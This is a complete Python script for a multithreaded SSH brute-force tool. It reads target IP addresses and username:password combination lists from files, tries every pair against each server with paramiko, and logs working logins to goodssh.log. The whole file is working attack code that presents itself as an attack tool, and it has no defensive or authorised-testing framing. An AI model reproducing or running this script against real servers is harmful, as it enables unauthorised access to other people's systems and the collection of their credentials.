#!/usr/bin/env python3
"""
SSH Brute Force Script
Reads IP addresses from targets.txt and credentials from combo.txt
Logs successful attempts to goodssh.log
"""

import paramiko
import threading
import time
import sys
from datetime import datetime

class SSHBruteForcer:
    def __init__(self, targets_file="targets.txt", combo_file="combo.txt", log_file="goodssh.log", max_threads=10):
        self.targets_file = targets_file
        self.combo_file = combo_file
        self.log_file = log_file
        self.max_threads = max_threads
        self.lock = threading.Lock()
        self.successful_attempts = []
        
    def load_targets(self):
        """Load IP addresses from targets file"""
        try:
            with open(self.targets_file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            print(f"[INFO] Loaded {len(targets)} targets from {self.targets_file}")
            return targets
        except FileNotFoundError:
            print(f"[ERROR] File {self.targets_file} not found!")
            return []
        except Exception as e:
            print(f"[ERROR] Error reading {self.targets_file}: {e}")
            return []
    
    def load_combos(self):
        """Load username:password combinations from combo file"""
        try:
            with open(self.combo_file, 'r') as f:
                combos = []
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        username, password = line.split(':', 1)
                        combos.append((username, password))
            print(f"[INFO] Loaded {len(combos)} credential combinations from {self.combo_file}")
            return combos
        except FileNotFoundError:
            print(f"[ERROR] File {self.combo_file} not found!")
            return []
        except Exception as e:
            print(f"[ERROR] Error reading {self.combo_file}: {e}")
            return []
    
    def ssh_connect(self, ip, username, password, port=22, timeout=5):
        """Attempt SSH connection with given credentials"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=port, username=username, password=password, timeout=timeout)
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException:
            return False
        except Exception:
            return False
    
    def log_success(self, ip, username, password):
        """Log successful SSH attempt"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] SUCCESS: {ip} - {username}:{password}\n"
        
        with self.lock:
            try:
                with open(self.log_file, 'a') as f:
                    f.write(log_entry)
                print(f"[SUCCESS] {ip} - {username}:{password}")
                self.successful_attempts.append((ip, username, password))
            except Exception as e:
                print(f"[ERROR] Failed to write to log file: {e}")
    
    def brute_force_target(self, ip, combos):
        """Brute force a single target with all credential combinations"""
        print(f"[INFO] Starting brute force on {ip}")
        
        for username, password in combos:
            try:
                if self.ssh_connect(ip, username, password):
                    self.log_success(ip, username, password)
                    # Continue testing other credentials on the same IP
                else:
                    print(f"[FAIL] {ip} - {username}:{password}")
            except Exception as e:
                print(f"[ERROR] Exception during connection to {ip}: {e}")
                continue
        
        print(f"[INFO] Completed brute force on {ip}")
    
    def run(self):
        """Main execution function"""
        print("=" * 60)
        print("SSH Brute Force Tool")
        print("=" * 60)
        
        # Load targets and credentials
        targets = self.load_targets()
        combos = self.load_combos()
        
        if not targets:
            print("[ERROR] No targets loaded. Exiting.")
            return
        
        if not combos:
            print("[ERROR] No credential combinations loaded. Exiting.")
            return
        
        print(f"[INFO] Starting brute force attack on {len(targets)} targets with {len(combos)} credential combinations")
        print(f"[INFO] Using {self.max_threads} threads")
        print(f"[INFO] Results will be logged to {self.log_file}")
        print("-" * 60)
        
        # Initialize log file
        try:
            with open(self.log_file, 'w') as f:
                f.write(f"SSH Brute Force Log - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 60 + "\n")
        except Exception as e:
            print(f"[ERROR] Failed to initialize log file: {e}")
            return
        
        # Create and start threads
        threads = []
        for i, target in enumerate(targets):
            if len(threads) >= self.max_threads:
                # Wait for a thread to finish
                for t in threads:
                    if not t.is_alive():
                        threads.remove(t)
                        break
                else:
                    # All threads still running, wait for one to finish
                    threads[0].join()
                    threads.pop(0)
            
            thread = threading.Thread(target=self.brute_force_target, args=(target, combos))
            thread.start()
            threads.append(thread)
            time.sleep(0.1)  # Small delay to prevent overwhelming
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        print("-" * 60)
        print(f"[INFO] Brute force attack completed!")
        print(f"[INFO] Found {len(self.successful_attempts)} successful login(s)")
        print(f"[INFO] Results saved to {self.log_file}")
        
        if self.successful_attempts:
            print("\nSuccessful logins:")
            for ip, username, password in self.successful_attempts:
                print(f"  {ip} - {username}:{password}")

def run_ssh_bruteforce(targets_file="targets.txt", combo_file="combo.txt", log_file="goodssh.log", max_threads=10):
    """Function to run the SSH brute force process."""
    # Check if paramiko is available
    try:
        import paramiko
    except ImportError:
        print("[ERROR] paramiko library not found!")
        print("Install it with: pip install paramiko")
        sys.exit(1)
    
    brute_forcer = SSHBruteForcer(targets_file, combo_file, log_file, max_threads)
    try:
        brute_forcer.run()
    except KeyboardInterrupt:
        print("\n[INFO] Attack interrupted by user")
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")

if __name__ == "__main__":
    print("SSH Brute Force Tool - Standalone Mode")
    print("This script is now primarily designed to be called as a function.")
    print("To run standalone, ensure targets.txt and combo.txt are in the same directory.")
    run_ssh_bruteforce()

